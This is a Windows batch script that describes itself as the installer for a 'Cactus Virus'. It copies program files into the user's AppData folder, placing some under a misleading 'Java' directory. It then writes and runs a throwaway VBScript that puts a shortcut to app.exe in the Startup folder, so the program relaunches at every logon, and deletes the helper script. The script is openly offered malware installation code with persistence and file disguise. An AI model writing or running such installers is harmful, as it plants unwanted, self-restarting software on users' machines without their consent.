@echo off
echo [INFO] Starting installation of the Cactus Virus at %time%

echo [INFO] Copy of the dist folder... 
xcopy /v /y /E /H /C /I dist C:\Users\%username%\appdata\roaming\dist\
echo [INFO] Dist folder copy ok

echo [INFO] Copy the assets folder....
xcopy /v /y /E /H /C /I assets C:\Users\%username%\appdata\roaming\Java\assets\
echo [INFO] Copy of the assets folder ok

echo [INFO] Creating the shortcut of app.exe
echo Set oWS = WScript.CreateObject("WScript.Shell") > CreateShortcut.vbs
echo sLinkFile = "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\app.lnk" >> CreateShortcut.vbs
echo Set oLink = oWS.CreateShortcut(sLinkFile) >> CreateShortcut.vbs
echo oLink.TargetPath = "%cd%\dist\app.exe" >> CreateShortcut.vbs
echo oLink.Save >> CreateShortcut.vbs
cscript CreateShortcut.vbs
del CreateShortcut.vbs
echo [INFO] Creation of the shortcut of app.exe ok

echo [INFO] Installation of Cactus Virus is complete
pause
